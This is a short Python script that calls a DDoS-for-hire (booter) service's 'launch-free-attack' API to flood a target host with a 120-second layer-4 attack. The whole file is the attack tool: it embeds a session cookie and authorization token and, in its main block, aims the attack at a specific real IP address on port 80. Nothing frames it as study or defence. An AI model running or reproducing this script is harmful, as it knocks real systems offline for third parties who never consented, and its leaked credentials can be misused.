# -*- coding:utf-8 -*-
# @time     : 2022-07-11 17:16:17
# @File     : blackstress.py
# @Author   : Twoyear
# @url      : https://blackstress.io/
import json

import requests


def blackstress_hurt_ip(host="", port=80):
    headers = {
        'authority': 'blackstress.io',
        'accept': '*/*',
        'accept-language': 'zh-CN,zh;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/json; charset=UTF-8',
        'cookie': '_csrf=wiFhPPFcc4K019tmI65zn2_2; __cf_bm=spcCEeYBysxXEXKCh5WhFbRRVaz6N.NrhvK8QwQTJiQ-1657531157-0-Af1mkt6oLUOgUaviJYYIZPF/hAJzDl/H6PdT6hWNlQQYzqQFlkPhkakDmUw75l35ZhYe1jfevuK1wHDmnYplysjxKs7q21Oj2M5SFs+4nBkCUk3ALcBxPWVMttHHwN74eA==; Authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDY1OSwiaWF0IjoxNjU3NTMxMTY5LCJleHAiOjE2NTc2MTc1Njl9.9aT1RYRfz4j2hAMIX3Dwj6J5BgNmMvKOAq0iB4OGvW0',
        'origin': 'https://blackstress.io',
        'pragma': 'no-cache',
        'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    }

    data = {"host": str(host),
            "port": port,
            "time": 120,
            "method": 20,
            "concurrents": 1,
            "layer": 4,
            "power_control": 100,
            "geo_location": ""
            }

    response = requests.post('https://blackstress.io/panel/api/launch-free-attack', headers=headers,
                             data=json.dumps(data))
    print(response.text)
    print(response.status_code)


if __name__ == '__main__':
    blackstress_hurt_ip("8.130.26.206",80)